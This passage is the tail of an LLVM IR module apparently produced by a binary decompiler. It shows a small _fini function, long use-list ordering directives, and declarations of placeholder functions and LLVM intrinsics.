define i32 @_fini() local_unnamed_addr {
entry:
  %v3_18fbc = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_18fbc)
  %v31_18fc4 = load i32, i32* @r0, align 4
  ret i32 %v31_18fc4

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 192, 193, 194, 16, 41, 76, 86, 195, 198, 199, 69, 17, 196, 197, 177, 45, 8, 200, 9, 18, 77, 0, 78, 10, 11, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 1, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 79, 40, 70, 71, 72, 73, 74, 75, 80, 81, 82, 83, 84, 85, 19, 190, 20, 191, 21, 22, 23, 24, 125, 126, 227, 228, 230, 57, 58, 59, 60, 25, 154, 155, 2, 26, 27, 88, 89, 3, 28, 29, 231, 232, 4, 30, 31, 163, 164, 5, 32, 33, 66, 67, 229, 111, 87, 179, 34, 54, 55, 180, 6, 181, 182, 183, 174, 52, 175, 176, 53, 35, 184, 185, 186, 187, 188, 90, 91, 165, 36, 166, 170, 37, 171, 151, 38, 152, 92, 39, 93, 172, 48, 173, 94, 42, 43, 127, 128, 129, 95, 44, 96, 46, 47, 130, 131, 132, 133, 63, 64, 97, 61, 62, 65, 98, 101, 102, 103, 104, 99, 100, 50, 105, 106, 107, 108, 109, 110, 68, 112, 113, 51, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 134, 135, 136, 137, 138, 139, 140, 12, 141, 142, 143, 144, 145, 146, 147, 167, 168, 7, 148, 149, 150, 153, 156, 157, 158, 159, 160, 161, 162, 169, 178, 189, 56, 49 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 68, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 73, 78, 79, 80, 81, 82, 83, 84, 74, 88, 89, 90, 91, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 39, 75, 76, 77, 85, 86, 87, 40, 41, 42, 36, 37, 38, 43, 47, 48, 44, 45, 46, 0, 92, 30, 31, 32, 33, 34, 35, 59, 60 }
  uselistorder i32 0, { 414, 413, 477, 478, 1341, 418, 417, 479, 1342, 1343, 1344, 1345, 365, 364, 480, 1346, 1347, 201, 1348, 1350, 1351, 148, 149, 1352, 1353, 1349, 95, 96, 97, 98, 2, 1, 3, 0, 190, 189, 191, 192, 193, 1354, 415, 416, 142, 137, 1355, 1356, 195, 196, 194, 197, 1357, 1358, 1359, 1360, 200, 199, 198, 1361, 1362, 1363, 405, 404, 481, 419, 482, 420, 483, 421, 484, 485, 486, 150, 1364, 435, 434, 1365, 1366, 433, 432, 1367, 487, 430, 431, 428, 429, 427, 426, 1368, 425, 424, 423, 422, 374, 1369, 1385, 1370, 204, 1371, 1372, 1373, 1374, 1375, 1376, 206, 1378, 1379, 202, 203, 1380, 1381, 128, 151, 1382, 1383, 654, 99, 100, 406, 407, 205, 1377, 1384, 373, 1386, 488, 489, 1387, 437, 436, 207, 1388, 1389, 208, 1390, 1391, 1392, 111, 490, 491, 1393, 209, 1394, 152, 1395, 1396, 210, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 39, 129, 492, 1407, 211, 1408, 1409, 1410, 4, 1411, 1412, 5, 1413, 1414, 866, 867, 6, 143, 1415, 493, 1416, 780, 781, 782, 783, 784, 788, 785, 786, 787, 7, 375, 101, 789, 494, 790, 791, 792, 438, 439, 868, 869, 8, 495, 725, 496, 1417, 1418, 1419, 9, 10, 153, 154, 155, 1434, 1435, 11, 726, 156, 157, 1251, 1252, 1253, 1254, 212, 213, 1255, 735, 214, 130, 50, 1436, 102, 376, 1440, 1441, 51, 793, 112, 794, 795, 796, 377, 158, 1437, 1438, 1439, 378, 12, 1442, 1443, 1444, 1445, 1446, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1447, 1448, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 40, 1467, 1468, 1469, 1470, 1471, 41, 1472, 1473, 1474, 42, 1475, 1476, 1477, 43, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1502, 1503, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 44, 1521, 1522, 1523, 1524, 1525, 45, 1526, 1527, 1528, 1529, 1530, 46, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 215, 797, 655, 798, 799, 800, 801, 835, 497, 498, 836, 837, 159, 160, 161, 219, 802, 217, 803, 824, 817, 656, 818, 819, 820, 821, 52, 53, 115, 822, 823, 379, 825, 826, 657, 827, 216, 828, 54, 55, 114, 829, 830, 658, 831, 832, 56, 57, 113, 833, 218, 834, 162, 804, 659, 805, 806, 499, 807, 808, 660, 809, 810, 813, 811, 812, 380, 814, 58, 59, 117, 815, 661, 60, 61, 116, 816, 838, 662, 839, 840, 841, 842, 843, 844, 663, 845, 846, 847, 848, 728, 727, 383, 730, 731, 729, 381, 382, 732, 733, 500, 734, 736, 737, 664, 738, 739, 740, 665, 741, 742, 62, 63, 118, 743, 744, 745, 103, 104, 746, 747, 748, 220, 749, 750, 751, 752, 753, 501, 754, 755, 756, 757, 758, 759, 163, 762, 666, 763, 764, 64, 65, 120, 765, 766, 767, 667, 768, 769, 770, 771, 668, 772, 773, 66, 67, 119, 774, 775, 776, 777, 778, 221, 223, 760, 222, 761, 224, 779, 164, 849, 854, 855, 850, 851, 852, 857, 858, 859, 225, 860, 861, 862, 863, 864, 853, 856, 865, 165, 870, 871, 872, 502, 990, 503, 873, 1420, 1421, 1422, 226, 1423, 1316, 1315, 1259, 1232, 1098, 875, 874, 876, 991, 992, 993, 1546, 1547, 1548, 1549, 227, 1550, 1551, 1552, 1260, 1261, 402, 403, 504, 1557, 672, 1558, 505, 1559, 1560, 506, 1561, 1562, 670, 228, 385, 1563, 671, 1564, 507, 105, 1565, 1566, 508, 1581, 1582, 1585, 669, 384, 1586, 440, 167, 166, 1583, 1584, 1553, 1554, 673, 229, 366, 716, 13, 14, 1577, 1122, 880, 1576, 1199, 1317, 138, 231, 1318, 674, 230, 1319, 1320, 1567, 1568, 1569, 1570, 509, 1571, 168, 954, 955, 68, 69, 121, 1321, 1322, 110, 387, 1326, 1323, 1324, 675, 1325, 1327, 676, 1328, 1329, 1330, 1331, 70, 71, 122, 1332, 232, 1333, 1334, 1335, 1337, 1336, 386, 717, 719, 718, 233, 720, 721, 722, 510, 723, 169, 1555, 1556, 956, 957, 958, 959, 960, 961, 235, 170, 962, 963, 964, 139, 234, 965, 171, 512, 513, 1572, 511, 172, 173, 1267, 1268, 1269, 1270, 1271, 236, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 237, 1262, 514, 1263, 1264, 515, 1265, 1266, 174, 1233, 516, 238, 1234, 1235, 1236, 1237, 1238, 175, 244, 241, 247, 242, 243, 246, 248, 245, 239, 240, 1279, 1280, 1304, 1305, 176, 1281, 1282, 252, 250, 251, 1283, 1284, 258, 257, 185, 249, 1285, 1286, 1287, 1288, 1289, 1290, 409, 408, 441, 517, 1291, 1292, 1293, 106, 1294, 254, 253, 255, 256, 184, 1295, 1296, 388, 1297, 1298, 146, 1299, 1300, 1301, 1302, 1303, 15, 16, 881, 882, 107, 17, 442, 518, 1222, 1200, 1202, 47, 1201, 1224, 1223, 1100, 1099, 884, 883, 966, 885, 886, 1226, 1225, 1227, 1256, 1587, 1588, 123, 177, 994, 995, 996, 259, 877, 878, 260, 997, 1002, 1003, 1004, 1005, 261, 998, 262, 999, 1000, 18, 263, 1006, 967, 519, 1101, 1573, 1574, 1575, 887, 889, 888, 1007, 890, 1338, 891, 892, 893, 1578, 1579, 1580, 1001, 19, 1424, 1425, 1426, 144, 1427, 1428, 1429, 1430, 1431, 264, 1432, 677, 680, 678, 679, 1433, 681, 186, 265, 1008, 1009, 140, 398, 1010, 1011, 682, 20, 389, 266, 267, 268, 72, 269, 520, 894, 1012, 1013, 1014, 1241, 1240, 1242, 1243, 1244, 1245, 48, 270, 1246, 1247, 1248, 271, 131, 132, 475, 476, 879, 273, 272, 274, 1015, 275, 1016, 1017, 276, 1306, 1307, 521, 277, 1018, 278, 279, 1153, 280, 1123, 281, 282, 902, 895, 283, 896, 897, 898, 709, 710, 712, 697, 698, 687, 699, 711, 700, 688, 701, 689, 702, 690, 703, 691, 704, 705, 133, 73, 369, 370, 706, 692, 707, 693, 708, 713, 714, 522, 715, 899, 683, 900, 523, 901, 391, 390, 903, 904, 905, 906, 285, 284, 907, 908, 909, 694, 367, 910, 124, 125, 368, 911, 126, 127, 524, 913, 914, 684, 915, 916, 917, 918, 919, 525, 920, 921, 922, 399, 187, 686, 923, 924, 925, 926, 927, 928, 685, 929, 930, 526, 931, 527, 932, 935, 936, 937, 286, 933, 287, 934, 288, 912, 1124, 1125, 938, 289, 939, 940, 941, 942, 943, 944, 945, 372, 371, 946, 528, 947, 529, 948, 530, 949, 410, 952, 531, 953, 532, 950, 951, 533, 968, 969, 970, 294, 293, 695, 178, 696, 292, 291, 290, 393, 400, 534, 971, 295, 296, 979, 972, 973, 974, 975, 976, 977, 978, 392, 535, 980, 536, 981, 537, 982, 538, 983, 539, 984, 985, 540, 986, 987, 988, 74, 989, 297, 541, 141, 1019, 1020, 1021, 1022, 396, 1023, 1024, 1025, 395, 1026, 1027, 1028, 1029, 298, 1030, 1032, 1031, 179, 180, 299, 394, 301, 300, 1033, 302, 303, 108, 304, 1034, 307, 1035, 1036, 1037, 1038, 306, 305, 308, 1039, 1040, 75, 76, 181, 1041, 1042, 21, 22, 23, 24, 1043, 1044, 309, 444, 1045, 542, 1046, 543, 1047, 544, 1048, 545, 1049, 546, 1050, 547, 1051, 443, 1052, 313, 1054, 1055, 1056, 1057, 311, 310, 314, 1058, 1059, 77, 78, 1053, 312, 1061, 1060, 25, 26, 27, 28, 1062, 315, 1063, 1064, 446, 1065, 548, 1066, 549, 1067, 550, 1068, 551, 1069, 552, 1070, 553, 1071, 445, 1072, 554, 1073, 319, 1075, 1076, 1077, 1078, 317, 316, 320, 1079, 1080, 79, 80, 1074, 318, 1081, 81, 555, 1082, 1084, 1085, 1086, 1087, 556, 1088, 29, 30, 31, 32, 33, 1083, 321, 1089, 1090, 452, 1091, 451, 1092, 450, 1093, 449, 1094, 447, 1095, 448, 1096, 557, 1097, 325, 1103, 1104, 1105, 1106, 323, 322, 326, 1107, 1108, 82, 83, 1102, 324, 1109, 84, 558, 1110, 1112, 1113, 1114, 1115, 559, 1116, 34, 35, 36, 37, 38, 1111, 327, 1117, 1118, 454, 1119, 453, 1120, 560, 1121, 330, 1126, 1127, 1128, 1129, 329, 328, 331, 1130, 1131, 85, 86, 188, 145, 332, 109, 562, 1132, 1133, 1134, 1135, 1136, 333, 1137, 1138, 457, 1139, 1140, 1141, 1142, 337, 334, 335, 336, 1143, 1144, 1145, 1146, 563, 1147, 1148, 456, 1149, 561, 1150, 455, 1151, 564, 1152, 339, 1154, 1155, 1156, 1157, 338, 340, 1158, 1159, 87, 88, 134, 1160, 341, 1161, 1162, 460, 1163, 458, 1164, 459, 1165, 1168, 1169, 1170, 343, 344, 1171, 1172, 89, 1166, 1167, 342, 1174, 1173, 1175, 345, 1176, 1177, 463, 1178, 462, 1179, 461, 1180, 565, 1181, 1183, 1184, 1185, 347, 348, 349, 1187, 1188, 90, 1186, 1182, 346, 1190, 1191, 1189, 1192, 350, 1193, 1194, 466, 1195, 465, 1196, 464, 1197, 566, 1198, 354, 1204, 1205, 1206, 1207, 353, 352, 355, 1208, 1209, 91, 92, 1203, 351, 1210, 1211, 356, 1212, 1213, 469, 1214, 468, 1215, 467, 1216, 567, 1217, 569, 135, 93, 1218, 182, 470, 570, 571, 1219, 1220, 357, 358, 1221, 568, 573, 136, 94, 1228, 183, 471, 574, 1229, 1230, 359, 360, 1231, 572, 411, 1239, 1249, 361, 1250, 1257, 362, 1258, 1308, 147, 1309, 1310, 412, 575, 397, 1311, 1312, 49, 401, 1313, 1314, 576, 1339, 363, 1340, 472, 724, 473, 474, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603 }
  uselistorder i32* @r4, { 83, 824, 825, 826, 827, 828, 846, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 10, 843, 844, 845, 847, 848, 849, 850, 851, 852, 853, 854, 90, 91, 92, 93, 136, 11, 137, 138, 139, 12, 140, 141, 142, 143, 144, 145, 146, 0, 13, 147, 148, 149, 150, 151, 152, 153, 154, 213, 214, 855, 84, 85, 86, 857, 858, 859, 5, 862, 57, 856, 743, 744, 94, 95, 96, 97, 98, 99, 100, 101, 102, 863, 864, 155, 156, 14, 4, 157, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 15, 158, 159, 160, 161, 162, 163, 164, 165, 184, 16, 185, 186, 166, 167, 169, 17, 170, 173, 18, 174, 175, 19, 176, 177, 20, 178, 179, 21, 180, 181, 22, 182, 54, 183, 168, 187, 23, 188, 189, 190, 191, 192, 193, 194, 171, 172, 87, 88, 89, 103, 104, 105, 106, 24, 107, 25, 26, 108, 109, 110, 111, 112, 113, 114, 119, 120, 27, 121, 122, 28, 123, 124, 29, 125, 126, 30, 127, 128, 31, 129, 130, 32, 131, 132, 115, 116, 117, 118, 133, 134, 135, 195, 196, 197, 33, 198, 199, 200, 34, 201, 202, 203, 204, 205, 206, 52, 207, 208, 209, 210, 211, 212, 215, 216, 217, 218, 348, 219, 860, 861, 806, 807, 808, 809, 810, 811, 707, 708, 349, 350, 881, 882, 883, 748, 749, 56, 886, 53, 887, 888, 889, 905, 907, 908, 909, 906, 890, 895, 903, 904, 884, 896, 897, 898, 899, 58, 812, 813, 6, 35, 814, 36, 815, 816, 817, 891, 892, 818, 75, 76, 77, 78, 79, 80, 885, 893, 894, 220, 221, 222, 223, 750, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 37, 766, 767, 768, 769, 751, 752, 753, 709, 710, 711, 712, 713, 714, 715, 716, 717, 38, 718, 719, 720, 721, 722, 723, 724, 725, 726, 770, 792, 793, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 55, 784, 785, 1, 786, 787, 788, 789, 790, 791, 227, 228, 229, 642, 643, 644, 645, 646, 649, 650, 651, 647, 648, 681, 682, 683, 684, 685, 686, 687, 495, 496, 497, 500, 501, 502, 498, 499, 230, 231, 232, 233, 234, 235, 236, 237, 238, 688, 689, 690, 691, 692, 693, 694, 351, 352, 353, 354, 355, 356, 357, 224, 225, 226, 358, 359, 360, 361, 9, 362, 363, 364, 365, 366, 367, 368, 239, 240, 241, 244, 245, 246, 242, 243, 247, 248, 249, 250, 251, 252, 900, 901, 902, 253, 254, 255, 369, 370, 371, 372, 373, 256, 257, 258, 585, 586, 544, 545, 259, 260, 261, 262, 263, 264, 265, 266, 70, 71, 72, 267, 268, 269, 270, 73, 61, 62, 59, 60, 63, 64, 65, 66, 67, 68, 69, 74, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 289, 290, 291, 292, 299, 300, 301, 302, 303, 7, 293, 294, 295, 296, 297, 298, 285, 286, 287, 288, 695, 696, 546, 547, 548, 549, 550, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 323, 324, 325, 326, 327, 328, 81, 317, 318, 319, 320, 321, 322, 39, 40, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 374, 375, 8, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 41, 392, 42, 393, 43, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 44, 418, 45, 419, 46, 420, 47, 421, 422, 423, 424, 48, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 49, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 50, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 652, 653, 51, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 2, 674, 675, 676, 677, 678, 679, 680, 697, 698, 699, 3, 700, 701, 702, 703, 704, 705, 706, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 745, 746, 747, 794, 795, 798, 796, 797, 799, 800, 801, 802, 803, 804, 805, 819, 820, 821, 822, 82, 823 }
}

declare i32 @__libc_errno() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
